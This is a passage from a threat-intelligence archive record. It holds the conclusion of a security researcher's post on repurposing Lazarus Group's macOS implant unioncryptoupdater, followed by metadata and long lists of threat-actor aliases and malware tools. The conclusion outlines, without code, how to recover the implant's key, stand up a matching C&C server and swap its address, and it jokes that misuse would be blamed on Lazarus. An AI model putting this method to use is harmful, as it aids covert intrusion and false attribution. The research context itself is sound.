Conclusion\n\nLazarus group proves yet again to be a well-resourced, persistent threat, that continues to\ntarget macOS users with ever evolving capabilities. ‚Ä¶so why not repurpose their malware\nfor our own surreptitious purposes!?\n\nTraditionally, repurposed malware has only been leveraged by sophisticated cyber\nadversaries:\n\n\n-----\n\nHowever in this blog post, we illustrated exactly how to ‚Äúrecycle‚Äù Lazarus latest implant,\n```\nunioncryptoupdater, in a few, fairly straightforward steps.\n\n```\nSpecifically, after reversing the sample to uncover its encryption key and encoding\nmechanism, we built a simple C&C server capable to speaking the malware‚Äôs protocol. And\nafter overwriting the embedded address of the attacker‚Äôs C&C server in the malware‚Äôs binary,\nwith our own, the repurposing was wholly complete.\n\nEnd result? An advanced persistent 1 -stage implant implant, capable of executing st **our 2nd-**\nstage payloads, directly from memory! And besides not having to write a single line of ‚Äúclientside‚Äù code, if our repurposed creation is ever discovered it will surely be (mis)attributed back\nto the Lazarus group. Win-freaking-Win!?\n\n[‚Ä¶and no, Catalina‚Äôs notarization requirements, will not thwart our ‚Äúrepurposed‚Äù creations! ü§≠](https://objectivebythesea.com/v3/content.html#pWardle)\n\n‚ù§ Love these blog posts and/or want to support my research and tools?\n[You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-22 - Weaponizing a Lazarus Group Implant- repurposing a 1st-stage loader, to execute custom 'fileless' payloads.pdf"
    ],
    "report_names": [
        "2020-02-22 - Weaponizing a Lazarus Group Implant- repurposing a 1st-stage loader, to execute custom 'fileless' payloads.pdf"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535575,
    "ts_updated_at": 1743041842,
    "ts_creation_date": 1653787394,
    "ts_modification_date": 1653787394,
    "files": {
        "pdf": "https://archive.orkl.eu/b0f177b251e2bdaf369010a960e0acd1a98a54df.pdf",
        "text": "https://archive.orkl.eu/b0f177b251e2bdaf369010a960e0acd1a98a54df.txt",
        "img": "https://archive.orkl.eu/b0f177b251e2bdaf369010a960e0acd1a98a54df.jpg"
    }
}